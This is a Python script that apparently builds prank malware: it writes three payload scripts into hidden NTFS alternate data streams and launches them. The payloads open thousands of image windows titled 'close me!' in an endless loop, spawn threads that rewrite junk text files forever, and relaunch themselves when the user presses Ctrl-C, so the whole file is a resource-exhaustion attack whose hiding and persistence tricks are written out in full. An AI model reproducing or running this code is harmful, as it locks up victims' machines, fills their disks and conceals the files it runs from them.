import os
import threading
import time
#this script should build the scritps together than run the __init__ file as the last stage of building 
global times,word
word="""
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar
ammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammarammar"""
times=5000 #loops per window

def ST1RT():
	try:
		os.system("python 3293x_.py:hidden.py")
	except Exception as error:
		os.system("python3 3293x_.py:hidden.py")

def hidden_():
	f=""
	os.system(f'echo {f} > 3827x_.py:hidden.py')
	os.system(f'echo {f} > 3293x_.py:hidden.py')
	os.system(f'echo {f} > 1928x_.py:hidden.py')

def windows_loop():
	with open("3827x_.py:hidden.py","w") as e:
		e.writelines(f"""
from customtkinter import *
from PIL import Image
global times
times={times}
def l00p():
	while True:
		main_window= CTk()
		main_window.state('withdraw')
		main_window.title("close me!")
		imag_path="image.jpg"
		ig=Image.open(imag_path)
		ctk_img=CTkImage(light_image=ig,size=(392,359))
		for i in range(times):
			window=CTkToplevel(main_window)
			window.title("ammar ammar ammar ammar ammar ammar ammar ammar")
			window.geometry("392x359")
			label =CTkLabel(window,text=' ',image=ctk_img)
			label.pack(pady=20)
		main_window.mainloop()
def main():
	l00p()
main()
			""")
		e.close()

def __init_():
	with open("3293x_.py:hidden.py","w") as f:
		f.writelines("""
import threading
import os
while True:
	try:
		def main():
			try:
				def start():
					def run(command):
						try:

							os.system(f"python3 {command}")
						except Exception as e:
							os.system(f"python {command}")
					run("text-loop.py")

				def start2():
					def run(command):
						try:
							os.system(f"python3 {command}")
						except Exception as e:
							os.system(f"python2 {command}")
					run("windows-loop.py")

				def thread_1():
					threading.Thread(target=start).start()
					threading.Thread(target=start2).start()

				def r2n():
					thread_1()

				r2n()
			except KeyboardInterrupt as e:
				r2n()
		main()
	except KeyboardInterrupt as e:
		main()
			""")
		f.close()

def text_loop():
	with open("1928x_.py:hidden.py","w") as r:
		r.writelines(f"""
import threading
global word,num
num=10
word={word}
def l00p_1():
	while 1:
		try:
			for i in range(num):
				with open("ammar_ammar_ammar_ammar.txt","w") as f:
					f.writelines(word)
					f.close()
		except Exception as e:
			pass
def l00p_2():

	while 1:
		try:
			for i in range(num):
				with open("ammar-ammar-ammar-ammar.txt","w") as z:
					z.writelines(word)
					z.close()
		except Exception as e:
			pass
def l00p_3():

	while 1:
		try:
			for i in range(num):
				with open("ammar_ammar_ammar_ammar.txt","w") as f:
					f.writelines(word)
					f.close()
		except Exception as e:
			pass
def l00p_4():
	while 1:
		try:
			for i in range(num):
				with open("ammar-ammar-ammar-ammar.txt","w") as z:
					z.writelines(word)
					z.close()
		except Exception as e:
			pass
def start():
	threading.Thread(target=l00p_1).start()
	threading.Thread(target=l00p_2).start()
	threading.Thread(target=l00p_3).start()
	threading.Thread(target=l00p_4).start()
start()
			""")

hidden_()
threading.Thread(target=windows_loop).start()
threading.Thread(target=__init_).start()
threading.Thread(target=text_loop).start()
time.sleep(1000)
ST1RT()
